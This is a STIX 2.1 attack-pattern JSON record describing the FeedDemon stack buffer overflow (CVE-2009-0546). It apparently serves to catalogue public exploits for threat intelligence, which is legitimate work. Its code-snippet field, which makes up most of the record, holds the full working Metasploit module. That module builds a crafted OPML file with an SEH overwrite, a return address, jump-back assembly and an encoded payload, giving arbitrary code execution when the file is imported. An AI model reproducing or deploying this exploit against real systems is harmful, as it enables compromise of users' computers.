{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f38380f-e624-4433-9b92-059d491085ef",
    "created": "2024-08-14T16:38:22.648202Z",
    "modified": "2024-08-14T16:38:22.648206Z",
    "name": "FeedDemon Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in FeedDemon v3.1.0.12. When the application is used to import a specially crafted opml file, a buffer overflow occurs allowing arbitrary code execution.  All versions are suspected to be vulnerable. This vulnerability was originally reported against version 2.7 in February of 2009.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/feeddemon_opml.rb",
            "external_id": "feeddemon_opml.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0546"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FeedDemon Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in FeedDemon v3.1.0.12. When the application\n        is used to import a specially crafted opml file, a buffer overflow occurs allowing\n        arbitrary code execution.\n\n        All versions are suspected to be vulnerable. This vulnerability was originally reported\n        against version 2.7 in February of 2009.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'fl0 fl0w',  # Original Exploit\n          'dookie',    # MSF Module\n          'jduck'      # SEH + AlphanumMixed fixes\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0546' ],\n          [ 'OSVDB', '51753' ],\n          [ 'BID', '33630' ],\n          [ 'EDB', '7995' ],\n          [ 'EDB', '8010' ],\n          [ 'EDB', '11379' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x0a\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xff\",\n          'DisableNops' => true,\n          # We are not strictly limited to alphanumeric. However, currently\n          # no encoder can handle our bad character set.\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n            },\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested OK on XPSP3 - jduck\n          [ 'Windows Universal',\n            {\n              'Ret' => 0x00501655   # p/p/r in FeedDemon.exe v3.1.0.12\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-02-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.opml']),\n      ])\n\n  end\n\n  def exploit\n\n    head_opml = '<opml version=\"1.1\">'\n    head_opml << '<body>'\n    head_opml << '<outline text=\"'\n\n    header = \"\\xff\\xfe\" # Unicode BOM\n    header << Rex::Text.to_unicode(head_opml)\n\n    foot_opml = '\">'\n    foot_opml << '<outline text=\"BKIS\" title=\"SVRT\" type=\"rss\" xmlUrl=\"http://milw0rm.com/rss.php\"/>'\n    foot_opml << '</outline>'\n    foot_opml << '</body>'\n    foot_opml << '</opml>'\n    footer = Rex::Text.to_unicode(foot_opml)\n\n    # Set ECX to point to the alphamixed encoded buffer (IIIII...)\n    # We use, while avoiding bad chars, an offset from SEH ptr stored on the stack at esp+8\n    off = 0x1ff2\n    set_ecx_asm = %Q|\n      mov ecx, [esp+8]\n      sub ecx, #{0x01010101 + off}\n      add ecx, 0x01010101\n    |\n    set_ecx = Metasm::Shellcode.assemble(Metasm::Ia32.new, set_ecx_asm).encode_string\n\n    # Jump back to the payload, after p/p/r jumps to us.\n    # NOTE: Putting the jmp_back after the SEH handler seems to avoid problems with badchars..\n    # 8 for SEH.Next+SEH.Func, 5 for the jmp_back itself\n    distance = 0x1ffd + 8 + 5\n    jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    # SEH\n    seh_frame = generate_seh_record(target.ret)\n\n    # Assemble everything together\n    sploit = ''\n    sploit << set_ecx\n    sploit << payload.encoded\n    sploit << rand_text_alphanumeric(8194 - sploit.length)\n    sploit << seh_frame\n    sploit << jmp_back\n    sploit << rand_text_alphanumeric(8318 - sploit.length)\n    # Ensure access violation reading from smashed pointer\n    num = rand_text(4).unpack('V')[0]\n    sploit << [num | 0x80000000].pack('V')\n\n    evil = header + sploit + footer\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(evil)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-09",
    "x_mitre_platforms": [
        "win'"
    ]
}